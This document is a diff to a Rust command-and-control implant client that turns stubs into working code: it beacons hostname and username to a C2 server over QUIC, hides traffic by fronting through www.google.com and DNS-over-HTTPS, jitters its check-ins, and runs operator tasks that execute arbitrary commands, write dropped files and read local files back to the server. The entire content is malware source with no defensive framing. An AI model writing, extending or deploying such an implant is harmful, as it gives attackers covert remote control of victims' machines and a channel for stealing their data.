@@ -1,17 +1,20 @@
 use anyhow::{anyhow, Result};
 use chacha20poly1305::{
     aead::{Aead, KeyInit, OsRng},
-    ChaCha20Poly1305, Nonce,
+    XChaCha20Poly1305, XNonce,
 };
 use quinn::{ClientConfig, Endpoint};
 use rustls::{ClientConfig as RustlsClientConfig, RootCertStore};
 use serde::{Deserialize, Serialize};
-use std::net::SocketAddr;
+use std::net::{SocketAddr, IpAddr};
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
-use rand::distributions::{Distribution, Poisson};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::process::Command;
 use rand::Rng;
+use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
+use trust_dns_resolver::TokioAsyncResolver;
 
 #[derive(Debug, Serialize, Deserialize)]
 pub enum C2Message {
@@ -44,7 +47,8 @@ pub struct C2Config {
     pub fronting_domain: String,
     pub doh_server: String,
     pub session_key: [u8; 32],
-    pub jitter_lambda: f64,
+    pub beacon_interval: u64,
+    pub jitter_percent: u32,
 }
 
 impl Default for C2Config {
@@ -55,7 +59,8 @@ impl Default for C2Config {
             fronting_domain: "www.google.com".to_string(),
             doh_server: "https://dns.google/dns-query".to_string(),
             session_key: [0u8; 32],
-            jitter_lambda: 2.0,
+            beacon_interval: 60,
+            jitter_percent: 20,
         }
     }
 }
@@ -63,19 +68,22 @@ impl Default for C2Config {
 pub struct C2Client {
     config: C2Config,
     endpoint: Option<Endpoint>,
-    cipher: ChaCha20Poly1305,
+    cipher: XChaCha20Poly1305,
+    resolver: DoHResolver,
 }
 
 impl C2Client {
     pub fn new(config: C2Config) -> Result<Self> {
-        let cipher = ChaCha20Poly1305::new(&config.session_key.into());
+        let cipher = XChaCha20Poly1305::new(&config.session_key.into());
+        let resolver = DoHResolver::new(config.doh_server.clone())?;
         Ok(C2Client {
             config,
             endpoint: None,
             cipher,
+            resolver,
         })
     }
-    
+
     pub async fn connect(&mut self) -> Result<()> {
         let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap())?;
         let mut root_store = RootCertStore::empty();
@@ -97,71 +105,175 @@ impl C2Client {
         self.endpoint = Some(endpoint);
         Ok(())
     }
-    
-    pub async fn send_beacon(&self, session_id: &str) -> Result<()> {
-        let hostname = gethostname::gethostname().to_string_lossy().to_string();
-        let username = std::env::var("USER").unwrap_or_else(|_| "unknown".to_string());
-        let timestamp = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)?
-            .as_secs();
-        let beacon = C2Message::Beacon {
-            session_id: session_id.to_string(),
-            hostname,
-            username,
-            timestamp,
-        };
-        self.send_message(beacon).await
-    }
-    
-    pub async fn send_message(&self, message: C2Message) -> Result<()> {
-        let serialized = bincode::serialize(&message)?;
-        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
-        let encrypted = self.cipher.encrypt(&nonce, serialized.as_ref())
-            .map_err(|e| anyhow!("Encryption failed: {}", e))?;
-        if let Some(endpoint) = &self.endpoint {
-            let addr: SocketAddr = format!("{}:{}", self.config.c2_domain, self.config.c2_port)
-                .parse()?;
-            let connection = endpoint.connect(addr, &self.config.fronting_domain)?.await?;
-            let mut stream = connection.open_uni().await?;
-            stream.write_all(nonce.as_slice()).await?;
-            stream.write_all(&encrypted).await?;
-            stream.finish().await?;
+
+    pub async fn resolve_c2(&self) -> Result<SocketAddr> {
+        let ips = self.resolver.resolve(&self.config.c2_domain).await?;
+        if let Some(ip) = ips.first() {
+            Ok(SocketAddr::new(*ip, self.config.c2_port))
+        } else {
+            Err(anyhow!("Could not resolve C2 domain"))
         }
-        Ok(())
-    }
-    
-    pub async fn receive_message(&self) -> Result<C2Message> {
-        Err(anyhow!("Not implemented"))
     }
 
-    pub async fn calculate_jitter(&self) -> Duration {
-        let poisson = Poisson::new(self.config.jitter_lambda).unwrap();
-        let delay_seconds = poisson.sample(&mut rand::thread_rng()) as u64;
-        let base_delay = Duration::from_secs(delay_seconds * 60);
-        let random_extra = Duration::from_secs(rand::thread_rng().gen_range(0..300));
-        base_delay + random_extra
+    pub async fn transact(&self, message: C2Message) -> Result<Option<C2Message>> {
+        let serialized = bincode::serialize(&message)?;
+        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
+        let encrypted = self.cipher.encrypt(&nonce, serialized.as_ref())
+            .map_err(|e| anyhow!("Encryption failed: {}", e))?;
+
+        if let Some(endpoint) = &self.endpoint {
+            let addr = self.resolve_c2().await?;
+            let connection = endpoint.connect(addr, &self.config.fronting_domain)?.await?;
+            let (mut send_stream, mut recv_stream) = connection.open_bi().await?;
+
+            // Send
+            send_stream.write_all(nonce.as_slice()).await?;
+            send_stream.write_all(&encrypted).await?;
+            send_stream.finish().await?;
+
+            // Receive
+            let mut buf = Vec::new();
+            recv_stream.read_to_end(&mut buf).await?;
+            if buf.is_empty() {
+                return Ok(None);
+            }
+
+            if buf.len() < 24 {
+                return Err(anyhow!("Response too short"));
+            }
+            let (nonce_bytes, ciphertext) = buf.split_at(24);
+            let nonce = XNonce::from_slice(nonce_bytes);
+            let decrypted = self.cipher.decrypt(nonce, ciphertext)
+                .map_err(|e| anyhow!("Decryption failed: {}", e))?;
+            let response: C2Message = bincode::deserialize(&decrypted)?;
+            return Ok(Some(response));
+        }
+        Ok(None)
     }
-    
+
+    pub async fn execute_task(&self, task_id: &str, command: &str, args: &[String]) -> C2Message {
+        match command {
+            "exec" => {
+                if args.is_empty() {
+                     return C2Message::Result { task_id: task_id.to_string(), output: "No command".into(), exit_code: 1 };
+                }
+                let program = &args[0];
+                let cmd_args = &args[1..];
+                match Command::new(program).args(cmd_args).output().await {
+                    Ok(output) => {
+                         C2Message::Result {
+                            task_id: task_id.to_string(),
+                            output: String::from_utf8_lossy(&output.stdout).to_string(),
+                            exit_code: output.status.code().unwrap_or(-1),
+                        }
+                    }
+                    Err(e) => {
+                        C2Message::Result {
+                            task_id: task_id.to_string(),
+                            output: format!("Exec failed: {}", e),
+                            exit_code: 1,
+                        }
+                    }
+                }
+            }
+            "upload" => {
+                 if args.len() < 2 {
+                     return C2Message::Result { task_id: task_id.to_string(), output: "Missing args".into(), exit_code: 1 };
+                 }
+                 let path = &args[0];
+                 let content = &args[1];
+                 match base64::decode(content) {
+                     Ok(data) => {
+                         match tokio::fs::write(path, data).await {
+                             Ok(_) => C2Message::Result { task_id: task_id.to_string(), output: "Upload success".into(), exit_code: 0 },
+                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Write failed: {}", e), exit_code: 1 },
+                         }
+                     }
+                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
+                 }
+            }
+            "download" => {
+                if args.is_empty() {
+                    return C2Message::Result { task_id: task_id.to_string(), output: "Missing path".into(), exit_code: 1 };
+                }
+                let path = &args[0];
+                match tokio::fs::read(path).await {
+                    Ok(data) => {
+                        let content = base64::encode(data);
+                        C2Message::Result { task_id: task_id.to_string(), output: content, exit_code: 0 }
+                    }
+                    Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Read failed: {}", e), exit_code: 1 },
+                }
+            }
+            "migrate" => {
+                 C2Message::Result { task_id: task_id.to_string(), output: "Migration initiated (stub)".into(), exit_code: 0 }
+            }
+            _ => C2Message::Result { task_id: task_id.to_string(), output: "Unknown command".into(), exit_code: 1 }
+        }
+    }
+
     pub async fn run_beacon_loop(&self, session_id: &str) -> Result<()> {
         loop {
-            self.send_beacon(session_id).await?;
+            let hostname = gethostname::gethostname().to_string_lossy().to_string();
+            let username = std::env::var("USER").unwrap_or_else(|_| "unknown".to_string());
+            let timestamp = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)?
+                .as_secs();
+            let beacon = C2Message::Beacon {
+                session_id: session_id.to_string(),
+                hostname,
+                username,
+                timestamp,
+            };
+
+            match self.transact(beacon).await {
+                Ok(Some(response)) => {
+                    if let C2Message::Task { task_id, command, args } = response {
+                        let result_msg = self.execute_task(&task_id, &command, &args).await;
+                        let _ = self.transact(result_msg).await;
+                    }
+                }
+                Ok(None) => {}
+                Err(_) => {}
+            }
+
             let jitter = self.calculate_jitter().await;
             sleep(jitter).await;
         }
     }
+
+    pub async fn calculate_jitter(&self) -> Duration {
+        let base = self.config.beacon_interval as f64;
+        let percent = self.config.jitter_percent as f64;
+        let range = base * (percent / 100.0);
+        let offset = rand::thread_rng().gen_range(-range..range);
+        let delay = (base + offset).max(1.0);
+        Duration::from_secs_f64(delay)
+    }
 }
 
 pub struct DoHResolver {
-    server_url: String,
+    resolver: TokioAsyncResolver,
 }
 
 impl DoHResolver {
-    pub fn new(server_url: String) -> Self {
-        DoHResolver { server_url }
+    pub fn new(server_url: String) -> Result<Self> {
+        let config = if server_url.contains("cloudflare") {
+            ResolverConfig::cloudflare_https()
+        } else if server_url.contains("quad9") {
+            ResolverConfig::quad9_https()
+        } else {
+            ResolverConfig::google_https()
+        };
+
+        let opts = ResolverOpts::default();
+        let resolver = TokioAsyncResolver::tokio(config, opts);
+        Ok(DoHResolver { resolver })
     }
-    
-    pub async fn resolve(&self, _domain: &str) -> Result<Vec<std::net::IpAddr>> {
-        Ok(vec![])
+
+    pub async fn resolve(&self, domain: &str) -> Result<Vec<IpAddr>> {
+        let response = self.resolver.lookup_ip(domain).await?;
+        Ok(response.iter().collect())
     }
 }
 
@@ -181,7 +293,7 @@ impl DomainFronting {
     pub fn get_sni(&self) -> &str {
         &self.fronting_domain
     }
-    
+
     pub fn get_host_header(&self) -> &str {
         &self.target_domain
     }
